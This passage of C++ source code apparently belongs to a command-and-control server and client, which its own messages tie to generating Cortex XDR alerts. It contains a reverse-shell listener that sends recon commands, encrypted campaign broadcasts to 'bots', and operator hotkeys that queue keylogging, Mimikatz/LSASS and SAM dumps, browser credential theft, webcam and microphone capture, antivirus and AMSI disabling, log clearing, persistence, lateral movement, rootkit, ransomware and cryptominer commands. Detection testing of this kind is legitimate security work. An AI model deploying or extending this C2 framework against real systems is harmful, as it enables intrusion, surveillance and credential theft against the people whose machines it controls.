                    while (serverRunning) {
                        sockaddr_in clientAddr;
                        int clientAddrSize = sizeof(clientAddr);
                        SOCKET client = accept(shellSocket, (sockaddr*)&clientAddr, &clientAddrSize);

                        if (client != INVALID_SOCKET) {
                            char clientIP[INET_ADDRSTRLEN];
                            inet_ntop(AF_INET, &clientAddr.sin_addr, clientIP, INET_ADDRSTRLEN);
                            logActivity("ATTACK", "SHELL_CONNECT", "Reverse shell connected from " + std::string(clientIP));

                            // Send commands
                            std::string cmd = "whoami && ipconfig && netstat -an\n";
                            send(client, cmd.c_str(), cmd.size(), 0);

                            closesocket(client);
                        }
                    }
                }
                closesocket(shellSocket);
            }
            });

        // Create RDP hijacker thread
        std::thread rdpHijacker([]() {
            while (serverRunning) {
                std::this_thread::sleep_for(std::chrono::seconds(60));
                logActivity("ATTACK", "RDP_HIJACK", "Attempting RDP session hijacking");
                logActivity("ATTACK", "RDP_TUNNEL", "Creating RDP tunnel through compromised host");
            }
            });

        // Create primary C2 listening socket
        SOCKET listenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (listenSocket == INVALID_SOCKET) {
            logActivity("ERROR", "SOCKET", "Failed to create socket");
            WSACleanup();
            return;
        }

        // Allow socket reuse
        int opt = 1;
        setsockopt(listenSocket, SOL_SOCKET, SO_REUSEADDR, (char*)&opt, sizeof(opt));

        // Try primary port first, then backup
        sockaddr_in serverAddr;
        serverAddr.sin_family = AF_INET;
        serverAddr.sin_addr.s_addr = INADDR_ANY;
        serverAddr.sin_port = htons(C2_PORT);

        int boundPort = C2_PORT;
        if (bind(listenSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
            logActivity("WARNING", "BIND", "Port 443 in use, trying backup port " + std::to_string(BACKUP_PORT));
            serverAddr.sin_port = htons(BACKUP_PORT);
            boundPort = BACKUP_PORT;

            if (bind(listenSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
                logActivity("ERROR", "BIND", "Failed to bind to any port");
                closesocket(listenSocket);
                WSACleanup();
                return;
            }
        }
        
        std::cout << "[+] C2 Server listening on 0.0.0.0:" << boundPort << std::endl;
        logActivity("SERVER", "START", "C2 server listening on port " + std::to_string(boundPort));

        if (listen(listenSocket, MAX_CLIENTS) == SOCKET_ERROR) {
            logActivity("ERROR", "LISTEN", "Failed to listen on socket");
            closesocket(listenSocket);
            WSACleanup();
            return;
        }



        // Start auxiliary threads
        std::thread dashboard(dashboardThread);
        // Disable DNS listener in manual mode to reduce noise
        // std::thread dnsThread(dnsListener);

        // Start attack campaign coordinator
        std::thread campaignThread([]() {
            std::vector<std::string> campaigns = {
                "APT_INITIAL_ACCESS",
                "COBALT_STRIKE_BEACON",
                "EMPIRE_STAGER",
                "METASPLOIT_METERPRETER",
                "POWERSHELL_EMPIRE",
                "LAZARUS_CAMPAIGN",
                "APT28_SOFACY",
                "APT29_COZY_BEAR",
                "CARBANAK_BANKING",
                "RANSOMWARE_DEPLOYMENT"
            };

            int campaignIndex = 0;
            while (serverRunning) {
                std::this_thread::sleep_for(std::chrono::seconds(45));

                if (!connectedClients.empty()) {
                    std::string campaign = campaigns[campaignIndex % campaigns.size()];
                    logActivity("ATTACK", "CAMPAIGN", "Launching campaign: " + campaign);

                    // Broadcast campaign to all clients
                    std::lock_guard<std::mutex> lock(clientsMutex);
                    for (auto& [id, client] : connectedClients) {
                        if (client.isActive) {
                            std::string campaignCmd = "CAMPAIGN:" + campaign + "\n";
                            send(client.socket, xorEncrypt(campaignCmd).c_str(), campaignCmd.size(), 0);
                        }
                    }
                    campaignIndex++;
                }
            }
            });

        // Client handling
        std::vector<std::thread> clientThreads;

        // Set socket to non-blocking
        u_long mode = 1;
        ioctlsocket(listenSocket, FIONBIO, &mode);

        logActivity("C2", "READY", "C2 Server ready for connections. Press ESC to shutdown.");
        
        // Display comprehensive startup information
        std::cout << "\n\033[32m";  // Green color
        std::cout << "+============================================================================+\n";
        std::cout << "|                         C2 SERVER STARTED SUCCESSFULLY                     |\n";
        std::cout << "+============================================================================+\n";
        std::cout << "| [!] WEB DASHBOARD:                                                         |\n";
        std::cout << "|    -> Complete Dashboard: http://localhost:8080/                           |\n";
        std::cout << "|    -> API Status: http://localhost:8080/api/status                        |\n";
        std::cout << "|    -> API Commands: http://localhost:8080/api/command                     |\n";
        std::cout << "+============================================================================+\n";
        std::cout << "| KEYBOARD SHORTCUTS:                                                        |\n";
        std::cout << "|                                                                            |\n";
        std::cout << "| ATTACK PHASES:                 SURVEILLANCE:            EVASION:           |\n";
        std::cout << "|   1 - Phase 1: Recon            S - Screenshot           A - Disable AV    |\n";
        std::cout << "|   2 - Phase 2: Priv Esc         K - Start Keylogger      C - Clear Logs   |\n";
        std::cout << "|   3 - Phase 3: Defense Evade    D - Dump Keylogs         T - TOR Connect  |\n";
        std::cout << "|   4 - Phase 4: Surveillance     W - Webcam Capture       N - SSH/Netcat   |\n";
        std::cout << "|   5 - Phase 5: Discovery        B - Browser Creds                         |\n";
        std::cout << "|                                                                            |\n";
        std::cout << "| EXPLOITATION:                  PERSISTENCE:             IMPACT:            |\n";
        std::cout << "|   M - Mimikatz/LSASS            P - Install Persist      R - Ransomware   |\n";
        std::cout << "|   L - Lateral Movement          F9 - Install Rootkit     F10 - Cryptominer|\n";
        std::cout << "|   E - Exfiltrate Data                                                     |\n";
        std::cout << "|                                                                            |\n";
        std::cout << "| FUNCTION KEYS:                                                            |\n";
        std::cout << "|   F1 - Full System Info         F7 - Token Stealing                       |\n";
        std::cout << "|   F2 - Process Hollowing        F8 - SAM Dump                             |\n";
        std::cout << "|   F3 - Microphone Record        F9 - Install Rootkit                      |\n";
        std::cout << "|   F4 - Clipboard Capture        F10 - Deploy Crypto Miner                 |\n";
        std::cout << "|   F5 - File Search              F11 - Cloud Upload                        |\n";
        std::cout << "|   F6 - Screen Recording         F12 - Remote Desktop                      |\n";
        std::cout << "|                                                                            |\n";
        std::cout << "|   H - Show Help Menu            ESC - Shutdown Server                     |\n";
        std::cout << "+============================================================================+\n";
        std::cout << "\033[0m\n";  // Reset color
        
        logActivity("C2", "WEB_DASHBOARD", "Web interface active at http://localhost:8080/");
        logActivity("C2", "HELP", "Press 'H' to show keyboard shortcuts at any time");
        
        // Track last queue check time
        auto lastQueueCheck = std::chrono::steady_clock::now();

        while (serverRunning) {
            sockaddr_in clientAddr;
            int clientAddrSize = sizeof(clientAddr);

            SOCKET clientSocket = accept(listenSocket, (sockaddr*)&clientAddr, &clientAddrSize);

            if (clientSocket != INVALID_SOCKET) {
                // Set client socket to blocking
                mode = 0;
                ioctlsocket(clientSocket, FIONBIO, &mode);

                // Handle client in new thread
                clientThreads.emplace_back(handleClient, clientSocket, clientAddr);

                // Log new connection for XDR
                char clientIP[INET_ADDRSTRLEN];
                inet_ntop(AF_INET, &clientAddr.sin_addr, clientIP, INET_ADDRSTRLEN);
                logActivity("ATTACK", "NEW_BOT", "New bot infection from " + std::string(clientIP));
            }

            // Check for server controls
            if (GetAsyncKeyState(VK_ESCAPE) & 0x8000) {
                logActivity("C2", "SHUTDOWN", "Shutdown signal received");
                serverRunning = false;
            }
            
            // Attack phase controls (1-5)
            if (GetAsyncKeyState('1') & 0x8000) {
                logActivity("C2", "COMMAND", "Executing Phase 1: Recon & Collection on all bots");
                for (const auto& [id, client] : connectedClients) {
                    if (client.isActive) {
                        executeAttackPhase(id, 1);
                    }
                }
                Sleep(200); // Debounce
            }
            else if (GetAsyncKeyState('2') & 0x8000) {
                logActivity("C2", "COMMAND", "Executing Phase 2: Privilege Escalation on all bots");
                for (const auto& [id, client] : connectedClients) {
                    if (client.isActive) {
                        executeAttackPhase(id, 2);
                    }
                }
                Sleep(200);
            }
            else if (GetAsyncKeyState('3') & 0x8000) {
                logActivity("C2", "COMMAND", "Executing Phase 3: Defense Evasion on all bots");
                for (const auto& [id, client] : connectedClients) {
                    if (client.isActive) {
                        executeAttackPhase(id, 3);
                    }
                }
                Sleep(200);
            }
            else if (GetAsyncKeyState('4') & 0x8000) {
                logActivity("C2", "COMMAND", "Executing Phase 4: Credential Access & Surveillance on all bots");
                for (const auto& [id, client] : connectedClients) {
                    if (client.isActive) {
                        executeAttackPhase(id, 4);
                    }
                }
                Sleep(200);
            }
            else if (GetAsyncKeyState('5') & 0x8000) {
                logActivity("C2", "COMMAND", "Executing Phase 5: Lateral Movement & Persistence on all bots");
                for (const auto& [id, client] : connectedClients) {
                    if (client.isActive) {
                        executeAttackPhase(id, 5);
                    }
                }
                Sleep(200);
            }
            
            // Special command controls
            else if (GetAsyncKeyState('R') & 0x8000) {
                logActivity("C2", "COMMAND", "Triggering ransomware simulation on all bots");
                for (const auto& [id, client] : connectedClients) {
                    if (client.isActive) {
                        clientCommandQueue[id].push_back(CMD_RANSOMWARE);
                    }
                }
                Sleep(200);
            }
            else if (GetAsyncKeyState('E') & 0x8000) {
                logActivity("C2", "COMMAND", "Executing data exfiltration on all bots");
                for (const auto& [id, client] : connectedClients) {
                    if (client.isActive) {
                        clientCommandQueue[id].push_back(CMD_COMPRESS_DATA);
                        clientCommandQueue[id].push_back(CMD_EXFIL_HTTP);
                        clientCommandQueue[id].push_back(CMD_EXFIL_DNS);
                    }
                }
                Sleep(200);
            }
            else if (GetAsyncKeyState('P') & 0x8000) {
                logActivity("C2", "COMMAND", "Installing persistence mechanisms on all bots");
                for (const auto& [id, client] : connectedClients) {
                    if (client.isActive) {
                        clientCommandQueue[id].push_back(CMD_INSTALL_SERVICE);
                        clientCommandQueue[id].push_back(CMD_REGISTRY_PERSIST);
                        clientCommandQueue[id].push_back(CMD_SCHEDULED_TASK);
                    }
                }
                Sleep(200);
            }
            else if (GetAsyncKeyState('C') & 0x8000) {
                logActivity("C2", "COMMAND", "Clearing logs on all bots");
                for (const auto& [id, client] : connectedClients) {
                    if (client.isActive) {
                        clientCommandQueue[id].push_back(CMD_CLEAR_LOGS);
                    }
                }
                Sleep(200);
            }
            else if (GetAsyncKeyState('S') & 0x8000) {
                std::cout << "\n\033[33m[!] MANUAL COMMAND TRIGGERED: S - Screenshot Capture\033[0m\n";
                logActivity("*** MANUAL ***", "S_PRESSED", "Screenshot capture initiated by operator");
                logActivity("C2", "COMMAND", "Taking screenshots from all bots");
                
                int targetCount = 0;
                for (const auto& [id, client] : connectedClients) {
                    if (client.isActive) {
                        clientCommandQueue[id].push_back(CMD_SCREENSHOT);
                        targetCount++;
                    }
                }
                
                std::cout << "\033[32m[+] Command queued for " << targetCount << " active client(s)\033[0m\n";
                Sleep(200);
            }
            else if (GetAsyncKeyState('K') & 0x8000) {
                logActivity("C2", "COMMAND", "Starting keylogger on all bots");
                for (const auto& [id, client] : connectedClients) {
                    if (client.isActive) {
                        clientCommandQueue[id].push_back(CMD_KEYLOG_START);
                    }
                }
                Sleep(200);
            }
            else if (GetAsyncKeyState('D') & 0x8000) {
                logActivity("C2", "COMMAND", "Dumping keylogger data from all bots");
                for (const auto& [id, client] : connectedClients) {
                    if (client.isActive) {
                        clientCommandQueue[id].push_back(CMD_KEYLOG_DUMP);
                    }
                }
                Sleep(200);
            }
            else if (GetAsyncKeyState('T') & 0x8000) {
                logActivity("C2", "COMMAND", "Establishing TOR connections on all bots");
                for (const auto& [id, client] : connectedClients) {
                    if (client.isActive) {
                        clientCommandQueue[id].push_back(CMD_TOR_CONNECT);
                        clientCommandQueue[id].push_back(CMD_TOR_API_CALL);
                    }
                }
                Sleep(200);
            }
            else if (GetAsyncKeyState('N') & 0x8000) {
                std::cout << "\n\033[33m[!] MANUAL COMMAND TRIGGERED: N - Network Tunnels (SSH/Netcat/Socat)\033[0m\n";
                std::cout << "\033[31m[WARNING] This will create REAL network processes and connections!\033[0m\n";
                logActivity("*** MANUAL ***", "N_PRESSED", "Network tunnels initiated by operator");
                logActivity("C2", "COMMAND", "Creating network tunnels (SSH/Netcat/Socat) on all bots");
                
                int targetCount = 0;
                for (const auto& [id, client] : connectedClients) {
                    if (client.isActive) {
                        clientCommandQueue[id].push_back(CMD_REVERSE_SSH);
                        clientCommandQueue[id].push_back(CMD_NETCAT_TUNNEL);
                        clientCommandQueue[id].push_back(CMD_SOCAT_RELAY);
                        targetCount++;
                    }
                }
                
                std::cout << "\033[32m[+] 3 network commands queued for " << targetCount << " active client(s)\033[0m\n";
                Sleep(200);
            }
            else if (GetAsyncKeyState('M') & 0x8000) {
                logActivity("C2", "COMMAND", "Executing Mimikatz on all bots");
                for (const auto& [id, client] : connectedClients) {
                    if (client.isActive) {
                        clientCommandQueue[id].push_back(CMD_MIMIKATZ_EXEC);
                        clientCommandQueue[id].push_back(CMD_LSASS_DUMP);
                    }
                }
                Sleep(200);
            }
            else if (GetAsyncKeyState('B') & 0x8000) {
                logActivity("C2", "COMMAND", "Stealing browser credentials on all bots");
                for (const auto& [id, client] : connectedClients) {
                    if (client.isActive) {
                        clientCommandQueue[id].push_back(CMD_BROWSER_CREDS);
                    }
                }
                Sleep(200);
            }
            else if (GetAsyncKeyState('W') & 0x8000) {
                logActivity("C2", "COMMAND", "Capturing webcam on all bots");
                for (const auto& [id, client] : connectedClients) {
                    if (client.isActive) {
                        clientCommandQueue[id].push_back(CMD_WEBCAM_CAPTURE);
                    }
                }
                Sleep(200);
            }
            else if (GetAsyncKeyState('L') & 0x8000) {
                logActivity("C2", "COMMAND", "Starting lateral movement on all bots");
                for (const auto& [id, client] : connectedClients) {
                    if (client.isActive) {
                        clientCommandQueue[id].push_back(CMD_PORT_SCAN);
                        clientCommandQueue[id].push_back(CMD_SMB_SCAN);
                        clientCommandQueue[id].push_back(CMD_PSEXEC);
                    }
                }
                Sleep(200);
            }
            else if (GetAsyncKeyState('A') & 0x8000) {
                logActivity("C2", "COMMAND", "Disabling AV and bypassing AMSI/ETW on all bots");
                for (const auto& [id, client] : connectedClients) {
                    if (client.isActive) {
                        clientCommandQueue[id].push_back(CMD_DISABLE_AV);
                        clientCommandQueue[id].push_back(CMD_AMSI_BYPASS);
                        clientCommandQueue[id].push_back(CMD_ETW_DISABLE);
                    }
                }
                Sleep(200);
            }
            else if (GetAsyncKeyState('H') & 0x8000) {
                // Show comprehensive help menu
                std::cout << "\n+============================================================================+\n";
                std::cout << "|                     C2 SERVER MANUAL CONTROL - HELP MENU                   |\n";
                std::cout << "+============================================================================+\n";
                std::cout << "| NOTE: All commands are executed on ALL connected clients                   |\n";
                std::cout << "+============================================================================+\n";
                std::cout << "| ATTACK PHASES (Manual Execution):                                          |\n";
                std::cout << "|   1 - Phase 1: Initial Reconnaissance                                      |\n";
                std::cout << "|   2 - Phase 2: Privilege Escalation                                        |\n";
                std::cout << "|   3 - Phase 3: Defense Evasion                                            |\n";
                std::cout << "|   4 - Phase 4: Credential Access & Surveillance                            |\n";
                std::cout << "|   5 - Phase 5: Lateral Movement & Persistence                             |\n";
                std::cout << "+============================================================================+\n";
                std::cout << "| INDIVIDUAL COMMANDS:                                                       |\n";
                std::cout << "|   A - Disable AV/AMSI/ETW (Defense Evasion)                              |\n";
                std::cout << "|   B - Browser Credential Theft (Chrome/Firefox/Edge)                      |\n";
                std::cout << "|   C - Clear Windows Event Logs                                            |\n";
                std::cout << "|   D - Dump Keylogger Data                                                 |\n";
                std::cout << "|   E - Exfiltrate Data (HTTP/DNS)                                          |\n";
                std::cout << "|   K - Start Keylogger                                                     |\n";
                std::cout << "|   L - Lateral Movement (Port Scan + SMB)                                  |\n";
                std::cout << "|   M - Mimikatz/LSASS Memory Dump                                          |\n";
                std::cout << "|   N - Network Tunnels (SSH/Netcat/Socat) [REAL PROCESSES]                |\n";
                std::cout << "|   P - Install Persistence (Registry/Scheduled Task)                       |\n";
                std::cout << "|   R - Deploy Ransomware Simulation                                        |\n";
                std::cout << "|   S - Take Screenshot                                                     |\n";
                std::cout << "|   T - TOR Connections & API Calls [REAL NETWORK TRAFFIC]                 |\n";
                std::cout << "|   W - Webcam Capture                                                      |\n";
                std::cout << "+============================================================================+\n";
                std::cout << "| FUNCTION KEYS:                                                            |\n";
                std::cout << "|   F1  - Full System Information Collection                                |\n";
                std::cout << "|   F2  - Process Hollowing Demonstration                                   |\n";
                std::cout << "|   F3  - Microphone Recording                                              |\n";
                std::cout << "|   F4  - Clipboard Data Capture                                           |\n";
                std::cout << "|   F5  - File Search & Enumeration                                        |\n";
                std::cout << "|   F6  - Screen Recording (10 seconds)                                    |\n";
                std::cout << "|   F7  - Token Stealing/Impersonation                                     |\n";
                std::cout << "|   F8  - SAM Database Dump                                                |\n";
                std::cout << "|   F9  - Install Rootkit/Bootkit                                          |\n";
                std::cout << "|   F10 - Deploy Crypto Miner                                              |\n";
                std::cout << "|   F11 - Cloud Service Upload                                             |\n";
                std::cout << "|   F12 - Enable Remote Desktop & Create User                              |\n";
                std::cout << "+============================================================================+\n";
                std::cout << "| CONTROL:                                                                   |\n";
                std::cout << "|   H   - Show this help menu                                              |\n";
                std::cout << "|   ESC - Shutdown C2 server                                               |\n";
                std::cout << "+============================================================================+\n";
                std::cout << "| WEB DASHBOARD: http://localhost:8080/                                     |\n";
                std::cout << "+============================================================================+\n";
                Sleep(200);
            }
            // Function key handlers
            else if (GetAsyncKeyState(VK_F1) & 0x8000) {
                logActivity("C2", "COMMAND", "Full system info collection on all bots");
                for (const auto& [id, client] : connectedClients) {
                    if (client.isActive) {
                        clientCommandQueue[id].push_back(CMD_SYSINFO);
                        clientCommandQueue[id].push_back(CMD_PROCESS_LIST);
                        clientCommandQueue[id].push_back(CMD_NETWORK_CONFIG);
                        clientCommandQueue[id].push_back(CMD_USER_ENUM);
                        clientCommandQueue[id].push_back(CMD_DOMAIN_INFO);
                        clientCommandQueue[id].push_back(CMD_SOFTWARE_ENUM);
                    }
                }
                Sleep(200);
            }
            else if (GetAsyncKeyState(VK_F2) & 0x8000) {
                logActivity("C2", "COMMAND", "Process hollowing demo on all bots");
                for (const auto& [id, client] : connectedClients) {
                    if (client.isActive) {
                        clientCommandQueue[id].push_back(CMD_PROCESS_HOLLOW);
                    }
                }
                Sleep(200);
            }
            else if (GetAsyncKeyState(VK_F3) & 0x8000) {
                logActivity("C2", "COMMAND", "Microphone recording on all bots");
                for (const auto& [id, client] : connectedClients) {
                    if (client.isActive) {
                        clientCommandQueue[id].push_back(CMD_MICROPHONE_RECORD);
                    }
                }
                Sleep(200);
            }
            else if (GetAsyncKeyState(VK_F4) & 0x8000) {
                logActivity("C2", "COMMAND", "Clipboard capture on all bots");
                for (const auto& [id, client] : connectedClients) {
                    if (client.isActive) {
                        clientCommandQueue[id].push_back(CMD_CLIPBOARD);
                    }
                }
                Sleep(200);
            }
            else if (GetAsyncKeyState(VK_F5) & 0x8000) {
                logActivity("C2", "COMMAND", "File search on all bots");
                for (const auto& [id, client] : connectedClients) {
                    if (client.isActive) {
                        clientCommandQueue[id].push_back(CMD_FILE_SEARCH);
                    }
                }
                Sleep(200);
            }
            else if (GetAsyncKeyState(VK_F6) & 0x8000) {
                logActivity("C2", "COMMAND", "Screen recording on all bots");
                for (const auto& [id, client] : connectedClients) {
                    if (client.isActive) {
                        clientCommandQueue[id].push_back(CMD_SCREEN_RECORD);
                    }
                }
                Sleep(200);
            }
            else if (GetAsyncKeyState(VK_F7) & 0x8000) {
                logActivity("C2", "COMMAND", "Token stealing on all bots");
                for (const auto& [id, client] : connectedClients) {
                    if (client.isActive) {
                        clientCommandQueue[id].push_back(CMD_TOKEN_STEAL);
                    }
                }
                Sleep(200);
            }
            else if (GetAsyncKeyState(VK_F8) & 0x8000) {
                logActivity("C2", "COMMAND", "SAM dump on all bots");
                for (const auto& [id, client] : connectedClients) {
                    if (client.isActive) {
                        clientCommandQueue[id].push_back(CMD_SAM_DUMP);
                    }
                }
                Sleep(200);
            }
            else if (GetAsyncKeyState(VK_F9) & 0x8000) {
                logActivity("C2", "COMMAND", "Installing rootkit on all bots");
                for (const auto& [id, client] : connectedClients) {
                    if (client.isActive) {
                        clientCommandQueue[id].push_back(CMD_ROOTKIT_INSTALL);
                    }
                }
                Sleep(200);
            }
            else if (GetAsyncKeyState(VK_F10) & 0x8000) {
                logActivity("C2", "COMMAND", "Deploying crypto miner on all bots");
                for (const auto& [id, client] : connectedClients) {
                    if (client.isActive) {
                        clientCommandQueue[id].push_back(CMD_CRYPTO_MINER);
                    }
                }
                Sleep(200);
            }
            else if (GetAsyncKeyState(VK_F11) & 0x8000) {
                logActivity("C2", "COMMAND", "Cloud upload on all bots");
                for (const auto& [id, client] : connectedClients) {
                    if (client.isActive) {
                        clientCommandQueue[id].push_back(CMD_CLOUD_UPLOAD);
                    }
                }
                Sleep(200);
            }
            else if (GetAsyncKeyState(VK_F12) & 0x8000) {
                std::cout << "\n\033[33m[!] MANUAL COMMAND TRIGGERED: F12 - Remote Desktop Access\033[0m\n";
                logActivity("*** MANUAL ***", "F12_PRESSED", "Remote desktop access initiated by operator");
                logActivity("C2", "COMMAND", "Remote desktop access on all bots");
                
                int targetCount = 0;
                for (const auto& [id, client] : connectedClients) {
                    if (client.isActive) {
                        clientCommandQueue[id].push_back(CMD_REMOTE_DESKTOP);
                        targetCount++;
                    }
                }
                
                std::cout << "\033[32m[+] Command queued for " << targetCount << " active client(s)\033[0m\n";
                Sleep(200);
            }
            
            // Process command queue every 500ms
            auto now = std::chrono::steady_clock::now();
            if (std::chrono::duration_cast<std::chrono::milliseconds>(now - lastQueueCheck).count() >= 500) {
                processCommandQueue();
                lastQueueCheck = now;
            }

            std::this_thread::sleep_for(std::chrono::milliseconds(100));
        }

        // Cleanup
        logActivity("C2", "CLEANUP", "Shutting down C2 infrastructure");

        closesocket(listenSocket);

        // Wait for threads
        if (dashboard.joinable()) dashboard.join();
        // if (dnsThread.joinable()) dnsThread.join();
        if (campaignThread.joinable()) campaignThread.join();
        if (reverseShellListener.joinable()) reverseShellListener.join();
        if (rdpHijacker.joinable()) rdpHijacker.join();

        for (auto& thread : clientThreads) {
            if (thread.joinable()) thread.join();
        }

        // Close all client connections
        {
            std::lock_guard<std::mutex> lock(clientsMutex);
            for (auto& [id, client] : connectedClients) {
                if (client.socket != INVALID_SOCKET) {
                    closesocket(client.socket);
                }
            }
        }

        WSACleanup();

        std::cout << "\n\033[32m"; // Green
        std::cout << "+================================================================+\n";
        std::cout << "|                   C2 SERVER SHUTDOWN COMPLETE                  |\n";
        std::cout << "|                                                                |\n";
        std::cout << "|  Attack logs saved to: C:\\temp\\                               |\n";
        std::cout << "|  - c2_server_detailed.log                                     |\n";
        std::cout << "|  - attack_timeline.log                                        |\n";
        std::cout << "|                                                                |\n";
        std::cout << "|  Check Cortex XDR console for comprehensive alerts!           |\n";
        std::cout << "+================================================================+\n";
        std::cout << "\033[0m\n"; // Reset

        std::cout << "Press any key to exit...\n";
        std::cin.get();
    }
    
    // Main function with command line parsing
    int main(int argc, char* argv[]) {
        // Initialize Winsock
        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
            std::cerr << "Failed to initialize Winsock" << std::endl;
            return 1;
        }
        
        // Parse command line arguments
        if (argc < 2) {
            std::cout << "Usage: " << argv[0] << " [server|client] [options]" << std::endl;
            std::cout << "\nServer mode: " << argv[0] << " server [--web]" << std::endl;
            std::cout << "Client mode: " << argv[0] << " client <server_ip> [port] [--no-auto-elevate]" << std::endl;
            std::cout << "\nExamples:" << std::endl;
            std::cout << "  " << argv[0] << " server                    - Start C2 server on default port 443" << std::endl;
            std::cout << "  " << argv[0] << " server --web              - Start C2 server with web dashboard" << std::endl;
            std::cout << "  " << argv[0] << " client 192.168.1.100     - Connect to C2 server at 192.168.1.100:443" << std::endl;
            std::cout << "  " << argv[0] << " client 192.168.1.100 8443 - Connect to C2 server at 192.168.1.100:8443" << std::endl;
            std::cout << "  " << argv[0] << " client 192.168.1.100 443 --no-auto-elevate - Connect without auto privilege escalation" << std::endl;
            WSACleanup();
            return 1;
        }
        
        std::string mode = argv[1];
        std::transform(mode.begin(), mode.end(), mode.begin(), ::tolower);
        
        if (mode == "server") {
            bool startWebDashboard = false;
            
            // Check for --web parameter
            for (int i = 2; i < argc; i++) {
                std::string arg = argv[i];
                if (arg == "--web" || arg == "--server") {
                    startWebDashboard = true;
                    break;
                }
            }
            
            runServer(startWebDashboard);
        } else if (mode == "client") {
            if (argc < 3) {
                std::cerr << "Error: Client mode requires server IP address" << std::endl;
                std::cerr << "Usage: " << argv[0] << " client <server_ip> [port]" << std::endl;
                WSACleanup();
                return 1;
            }
            
            std::string serverIP = argv[2];
            int serverPort = C2_PORT; // Default port
            bool autoElevate = true;
            
            // Parse optional arguments
            for (int i = 3; i < argc; i++) {
                std::string arg = argv[i];
                if (arg == "--no-auto-elevate") {
                    autoElevate = false;
                } else {
                    // Try to parse as port number
                    try {
                        serverPort = std::stoi(arg);
                    } catch (...) {
                        std::cerr << "Warning: Unknown argument '" << arg << "'" << std::endl;
                    }
                }
            }
            
            runClient(serverIP, serverPort, autoElevate);
        } else {
            std::cerr << "Error: Unknown mode '" << mode << "'" << std::endl;
            std::cerr << "Valid modes: server, client" << std::endl;
            WSACleanup();
            return 1;
        }
        
        WSACleanup();
        return 0;
    }